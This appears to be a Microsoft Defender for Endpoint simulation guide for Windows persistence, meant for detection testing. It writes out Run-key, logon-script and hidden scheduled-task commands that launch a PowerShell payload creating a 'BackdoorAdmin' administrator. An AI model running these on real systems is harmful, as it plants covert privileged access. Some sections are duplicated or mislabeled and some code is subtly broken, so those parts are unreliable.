# Account Persistence

## Overview

Account persistence refers to techniques used by attackers to maintain long-term access to a system even after security measures are applied or the system is rebooted. Creating registry Run keys, Startup Folder entries, Boot/Logon Initialization Scripts, and scheduled tasks are common persistence techniques. By establishing these mechanisms, attackers ensure their malicious programs run automatically, maintaining their foothold across system reboots.

## MITRE ATT&CK Mapping

| Tactic | Technique ID | Technique Name |
| --- | --- | --- |
| Persistence | T1112 | Modify Registry |
| Persistence | T1037 | Boot or Logon Initialization Scripts |
| Persistence | T1037.001 | Logon Script (Windows) |
| Persistence | T1053.005 | Scheduled Task/Job: Scheduled Task |
| Persistence | T1547.001 | Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder |
| Execution | T1053.005 | Scheduled Task/Job: Scheduled Task |

## Expected Alerts

| Alert Title | Alert Description | Alert Details |
| --- | --- | --- |
| Anomaly detected in ASEP registry | A process registered a suspicious command or file in ASEP registry key, where it will be run after a reboot. An attacker may place a malicious piece of software in such a location to prevent losing access if a machine is turned off. | **Category:** Persistence<br/>**MITRE ATT&CK Techniques:** T1112: Modify Registry, T1547.001: Registry Run Keys / Startup Folder<br/>**Service source:** Microsoft Defender for Endpoint<br/>**Detection source:** EDR<br/>**Detection technology:** Behavior,Network<br/>**Detection status:** Detected |
| Suspicious logon script registration | A script was suspiciously registered as a logon script. Anomalies in the process chain leading up to this activity or the script file itself indicate possible malicious intent. Attackers can use logon scripts to automatically run malicious code when users sign in and establish persistence. | **Category:** Persistence<br/>**MITRE ATT&CK Techniques:** T1037: Boot or Logon Initialization Scripts, T1037.001: Logon Script (Windows)<br/>**Service source:** Microsoft Defender for Endpoint<br/>**Detection source:** EDR<br/>**Detection technology:** Behavior,Network<br/>**Detection status:** Detected |
| Suspicious scheduled task | A potentially malicious file or command line was registered as a scheduled task. Attackers often use scheduled tasks to establish persistence, but they are also used to invoke a single activity or a chain of activities. | **Category:** Execution<br/>**MITRE ATT&CK Techniques:** T1053: Scheduled Task/Job, T1053.005: Scheduled Task<br/>**Service source:** Microsoft Defender for Endpoint<br/>**Detection source:** EDR<br/>**Detection technology:** Behavior,Network<br/>**Detection status:** Detected |

## Attack Simulation

### Prerequisites

- Windows 10/11 or Windows Server test environment
- PowerShell running as **Administrator** (for HKLM mode)
- Microsoft Defender for Endpoint onboarded device

### Script: Invoke-AccountPersistenceSimulation.ps1

#### Parameters

| Parameter | Type | Required | Default | Description |
| --- | --- | --- | --- | --- |
| `Mode` | String | No | `HKLM` | The persistence method to simulate. Valid values: `HKLM` (HKEY_LOCAL_MACHINE Run key), `HKCU` (HKEY_CURRENT_USER Run key), `Scheduler` (Scheduled Task) |
| `OutputPath` | String | No | `$env:TEMP\Persistence` | Directory where persistence artifacts are created |
| `Cleanup` | Switch | No | — | Removes all persistence mechanisms and files created by the simulation |
| `Force` | Switch | No | — | Skip the confirmation prompt before execution |

#### What the Script Does

1. **Creates a base64-encoded PowerShell script** — Generates a persistence payload that creates a backdoor user account.
2. **Establishes persistence** — Based on the selected mode:
   - **HKLM**: Creates a registry Run key in `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run`
   - **HKCU**: Creates a registry Run key in `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`
   - **Scheduler**: Creates a scheduled task that runs at logon
3. **Creates a backdoor user account** — When executed, adds `BackdoorAdmin` to the local Administrators group.

## Setup

### Usage Examples

```powershell
# Run with default HKLM persistence
.\Invoke-AccountPersistenceSimulation.ps1

# Run HKCU persistence (no admin required)
.\Invoke-AccountPersistenceSimulation.ps1 -Mode HKCU

# Run scheduled task persistence
.\Invoke-AccountPersistenceSimulation.ps1 -Mode Scheduler

# Run with Force to skip confirmation
.\Invoke-AccountPersistenceSimulation.ps1 -Mode HKLM -Force

# Clean up all persistence mechanisms
.\Invoke-AccountPersistenceSimulation.ps1 -Cleanup -Mode HKLM
```

### Expected Output

```
================================================
                 ***  WARNING  *** 
     Account Persistence Simulation Script
================================================

This script will create persistence mechanisms that may be detected as malicious:
  - Create a registry Run key in HKEY_LOCAL_MACHINE
    (Requires Administrator privileges)
  - Create a base64-encoded PowerShell script
  - Create a backdoor user account 'BackdoorAdmin'
  - Add the backdoor user to the Administrators group
  - Generate persistence logs

Mode: HKLM
Output will be saved to: C:\Users\...\AppData\Local\Temp\Persistence

Do you want to continue? (Y/N): Y

[+] Created persistence script at: C:\Users\...\AppData\Local\Temp\Persistence\persistence.ps1
[+] Created registry Run key: HKLM\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate
[+] Persistence mechanism established successfully!
```

## Scenario Execution

1. Open an elevated PowerShell prompt on the test device.
2. Navigate to the directory containing the script.
3. Run `.\Invoke-AccountPersistenceSimulation.ps1 -Mode HKLM` (or `HKCU` or `Scheduler`).
4. Confirm with `Y` when prompted (or use `-Force` to skip).
5. The script creates the persistence mechanism and outputs confirmation.
6. Reboot the system to trigger the persistence payload (optional, for full simulation).
7. Monitor the Microsoft Defender for Endpoint portal for persistence-related alerts.
8. After testing, run `.\Invoke-AccountPersistenceSimulation.ps1 -Cleanup -Mode HKLM` to remove artifacts.

## Why Does This Matter

Persistence mechanisms are critical to attacker operations because:

- **Survive reboots** — Without persistence, attackers lose access when the system restarts, requiring them to re-exploit the target.
- **Maintain access during remediation** — Multiple persistence mechanisms make complete removal difficult, allowing attackers to regain access even after partial cleanup.
- **Enable long-term operations** — Advanced persistent threats (APTs) rely on persistence to conduct extended campaigns for data exfiltration or espionage.
- **Automate malicious activity** — Scheduled tasks and logon scripts can execute payloads without user interaction.

Detecting and removing persistence mechanisms is essential for complete incident remediation.

## Best Practices

- **Monitor ASEP registry keys** — Alert on modifications to Run, RunOnce, and other auto-start registry locations
- **Audit scheduled task creation** — Enable Event ID 4698 (scheduled task created) auditing and review new tasks regularly
- **Implement application whitelisting** — Prevent unauthorized executables from running via persistence mechanisms
- **Use PowerShell logging** — Enable Script Block Logging to capture persistence payload contents
- **Review logon scripts** — Regularly audit logon script configurations in registry and Group Policy
- **Enable Tamper Protection** — Prevent attackers from disabling security controls before establishing persistence

## Clean-Up

Auto-Start Extensibility Points (ASEP) registry keys control which programs or scripts automatically execute when your system boots or when a user logs in. These keys can also be exploited by malware to achieve persistence, ensuring that malicious programs run every time the system starts.

The common ASEP keys on windows are:

* HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
* HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
* HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
* HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce

Run the following commands in Windows Command Prompt on a test device.

```powershell
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v ASEPAttackSim /t REG_SZ /d "powershell -executionpolicy bypass -file $env:TEMP\new-user.ps1"
```

### Boot Logon

Windows allows these scripts to run each time a specific user or group logs into a system, providing attackers a reliable method to establish persistence.

Target registry key path:

* HKEY_CURRENT_USER\EnvironmentUserInitMprLogonScript

Run the following commands in Windows Command Prompt on a test device.

```powershell
reg add "HKEY_CURRENT_USER\Environment" /v UserInitMprLogonScript /t REG_SZ /d "powershell -executionpolicy bypass -file $env:TEMP\new-user.ps1"
```

### Task Scheduler

The following script creates the Task Action (New-ScheduledTaskAction) which launches powershell with an Execution Policy of Bypass and in a Hidden Window so the user won't notice. The Script then creates the Trigger (New-ScheduledTaskTrigger) of AtLogOn which means the script will run any time a user logs onto the system. Finally the script creates the actual Scheuled Task (Register-ScheduledTask) based on the Action and Triggers.

```powershell
# Define variables
$TaskName = "Persistence-ScheduledTask"
$ScriptPath = "$env:TEMP\new-user.ps1"

# Create an action to run the PowerShell script
$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $("-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$ScriptPath"")"

# Create a trigger to run the task at logon
$Trigger = New-ScheduledTaskTrigger -AtLogOn

# Create settings for the task
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable

# Register the scheduled task
Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Description "Runs a malicious PowerShell script at logon"
```

## Clean-Up

```powershell
# Using the script
.\Invoke-AccountPersistenceSimulation.ps1 -Cleanup -Mode HKLM
.\Invoke-AccountPersistenceSimulation.ps1 -Cleanup -Mode HKCU
.\Invoke-AccountPersistenceSimulation.ps1 -Cleanup -Mode Scheduler

# Manual cleanup - ASEP Entries
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v ASEPAttackSim /f

# Manual cleanup - Boot Logon Entry
reg delete "HKEY_CURRENT_USER\Environment" /v UserInitMprLogonScript /f

# Manual cleanup - Task Scheduler
$TaskName = "Persistence-ScheduledTask"
Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false

# Remove backdoor user account
Remove-LocalUser -Name "BackdoorAdmin" -ErrorAction SilentlyContinue
```

## References

- [MITRE ATT&CK T1547.001 - Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001/)
- [MITRE ATT&CK T1053.005 - Scheduled Task](https://attack.mitre.org/techniques/T1053/005/)
- [MITRE ATT&CK T1037.001 - Logon Script (Windows)](https://attack.mitre.org/techniques/T1037/001/)
- [Microsoft Docs - Windows Auto-Start Extensibility Points](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns)

## Additional Manual Commands

### ASEP Registry Keys (Manual Commands)

Auto-Start Extensibility Points (ASEP) registry keys control which programs or scripts automatically execute when your system boots or when a user logs in. These keys can also be exploited by malware to achieve persistence, ensuring that malicious programs run every time the system starts.

The common ASEP keys on windows are:

* HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
* HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
* HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
* HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce

Run the following commands in Windows Command Prompt on a test device.

```powershell
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v ASEPAttackSim /t REG_SZ /d "powershell -executionpolicy bypass -file $env:TEMP\new-user.ps1"
```

### Boot Logon

Windows allows these scripts to run each time a specific user or group logs into a system, providing attackers a reliable method to establish persistence.

Target registry key path:

* HKEY_CURRENT_USER\EnvironmentUserInitMprLogonScript

Run the following commands in Windows Command Prompt on a test device.

```powershell
reg add "HKEY_CURRENT_USER\Environment" /v UserInitMprLogonScript /t REG_SZ /d "powershell -executionpolicy bypass -file $env:TEMP\new-user.ps1"
```

### Task Scheduler

The following script creates the Task Action (New-ScheduledTaskAction) which launches powershell with an Execution Policy of Bypass and in a Hidden Window so the user won't notice. The Script then creates the Trigger (New-ScheduledTaskTrigger) of AtLogOn which means the script will run any time a user logs onto the system. Finally the script creates the actual Scheuled Task (Register-ScheduledTask) based on the Action and Triggers.

```powershell
# Define variables
$TaskName = "Persistence-ScheduledTask"
$ScriptPath = "$env:TEMP\new-user.ps1"

# Create an action to run the PowerShell script
$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $("-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$ScriptPath"")"

# Create a trigger to run the task at logon
$Trigger = New-ScheduledTaskTrigger -AtLogOn

# Create settings for the task
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable

# Register the scheduled task
Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Description "Runs a malicious PowerShell script at logon"
```
